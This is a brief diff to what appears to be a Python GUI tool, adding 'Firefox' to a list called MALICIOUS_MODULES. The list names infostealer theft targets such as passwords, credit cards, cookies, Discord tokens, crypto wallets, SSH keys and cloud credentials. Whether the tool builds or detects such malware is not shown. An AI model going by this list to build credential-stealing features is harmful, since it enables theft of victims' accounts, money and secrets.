@@ -42,9 +42,10 @@ MUTED     = "#7a7a85"
 DANGER    = "#ff4d5e"
 TITLEBAR  = "#0c0c10"
 
+
 MALICIOUS_MODULES = [
     "System Info", "Passwords", "Credit Cards", "Cookies",
-    "History", "Downloads", "Autofill", "Extensions",
+    "History", "Downloads", "Autofill", "Extensions", "Firefox",
     "Discord Tokens", "Discord Metadata", "Roblox Cookies",
     "Wallets", "Browser Wallets", "Game Launchers", "Steam Extended",
     "VPN", "FTP Clients", "SSH Keys", "Cloud Credentials",
